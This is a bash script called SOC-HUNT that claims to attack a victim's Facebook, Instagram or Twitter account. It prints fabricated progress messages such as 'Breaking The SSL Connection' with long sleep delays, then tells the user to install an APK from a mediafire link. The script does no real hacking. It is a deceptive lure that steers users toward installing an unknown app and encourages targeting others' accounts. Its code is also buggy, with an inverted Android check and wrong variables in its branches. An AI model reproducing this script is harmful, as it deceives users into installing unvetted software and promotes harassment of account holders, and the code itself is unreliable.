#!/bin/bash

now="$(date)"
printf "%s\n"
now="$(date +'%d/%m/%Y')"

m="$(date)"

m="$(date +'%H:%M:%S')"

null="~> /dev/null 2>&1"
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
i="\033[33m"
P="\033[35m"
w="\033[0m"
B="\e[1;40m"
M="\e[1;45m"
C="\e[1;46m"
B="\e[1;40m"
w="\033[0m"
Z="\033[4;31m"
K="\033[0;100m"
D="\033[4;31m"
G="\033[1;96m"
W="\e[1;0m"
LG="\033[1;30m"
GL="\033[1;33m"
CA="\033[1;0;36m"
BO="\033[1;0;33m"
C1="\033[1;92m"
LC="\033[0;37m"

i="$(printf '\033[33m')" LG="$(printf '\033[1;30m')" GL="$(printf '\033[1;33m')"
b="$(printf '\033[1;34m')" G1="$(printf '\033[1;92m')" BO="$(printf '\033[1;0;33m')"
P1="$(printf '033[35m')"


if [[  ! -e "/system/bin/adb" ]]; then
	echo ""
else
	echo $r"Sorry This Tool Will Work Only On Android...."
	exit
fi


echo -e $i""
figlet SOC-HUNT
echo -e $P"Simple Tool That Hunt Victim Account"
echo ""
echo -e "$r 1$i->$G Facebook "
echo ""
echo -e "$r 2$i->$G Instagram"
echo ""
echo -e "$r 3$i->$G Twitter"$P
echo ""

read -p "Select Your Option : " PROC

	case $PROC in 

	1)	echo ""
		echo -e "$g Enter Name Of Victim Profile Id :$P "
		read ACF
		echo ""
		echo -e "$b Checking Account....."$P
		echo ""
		sleep 5
		am start --user 0 -a android.intent.action.VIEW -d https://facebook.com/$ACF &> /dev/null;
		read -p " Is That Is Victim Accout(y/n) : " VI
		if [[ $VI = y ]]; then
			echo ""
		else 
			exit
		fi
		echo -e "$r Started To Hunting $ACF ......"
		echo ""
		sleep 5
		echo -e "$g Connecting To Facebook With SSL...."
		sleep 26
		echo ""
		echo -e "$g Connected To The Account..."
		echo ""
		sleep 3
		echo -e "$G Breaking The SSL Connection..."
		sleep 37
		echo ""
		echo -e "$G Placing The Bad Report To Victim Id..."
		echo ""
		sleep 49
		echo ""
		echo -e "$g All Done Install The Apk Given In The Link"
		echo ""
		echo -e "$i Link :$P https://www.mediafire.com/file/z6vxe2jf27rvi20/SocHunt.apk/file"
		;;


	2)
		echo ""
                echo -e "$g Enter Name Of Victim Id :$P "
                read ACF1
                echo ""
                echo -e "$b Checking Account....."$P
                echo ""
                sleep 5
                am start --user 0 -a android.intent.action.VIEW -d https://instagram.com/$ACF1 &> /dev/null;
                read -p " Is That Is Victim Accout(y/n) : " VI1
                if [[ $VI1 = y ]]; then
                        echo ""
                else
                        exit
                fi
                echo -e "$r Started To Hunting $ACF1 ......"
                echo ""
                sleep 5
                echo -e "$g Connecting To Facebook With SSL...."
                sleep 9
                echo ""
                echo -e "$g Connected To The Account..."
                echo ""
                sleep 3
                echo -e "$G Breaking The SSL Connection..."
                sleep 10
                echo ""
                echo -e "$G Placing The Bad Report To Victim Id..."
                echo ""
                sleep 9
                echo ""
                echo -e "$g All Done Install The Apk Given In The Link"
                echo ""
                echo -e "$i Link :$P https://www.mediafire.com/file/z6vxe2jf27rvi20/SocHunt.apk/file"
		;;


	3)
	        echo ""
                echo -e "$g Enter Name Of Victim Profile Id :$P "
                read ACF2
                echo ""
                echo -e "$b Checking Account....."$P
                echo ""
                sleep 5
                am start --user 0 -a android.intent.action.VIEW -d https://twitter.com/$ACF &> /dev/null;
                read -p " Is That Is Victim Accout(y/n) : " VI1
                if [[ $VI2 = y ]]; then
                        echo ""
                else
                        exit
                fi
                echo -e "$r Started To Hunting $PROC ......"
                echo ""
                sleep 5
                echo -e "$g Connecting To Facebook With SSL...."
                sleep 9
                echo ""
                echo -e "$g Connected To The Account..."
                echo ""
                sleep 3
                echo -e "$G Breaking The SSL Connection..."
                sleep 10
                echo ""
                echo -e "$G Placing The Bad Report To Victim Id..."
                echo ""
                sleep 9
                echo ""
                echo -e "$g All Done Install The Apk Given In The Link"
                echo ""
                echo -e "$i Link :$P https://www.mediafire.com/file/z6vxe2jf27rvi20/SocHunt.apk/file"
		;;
esac


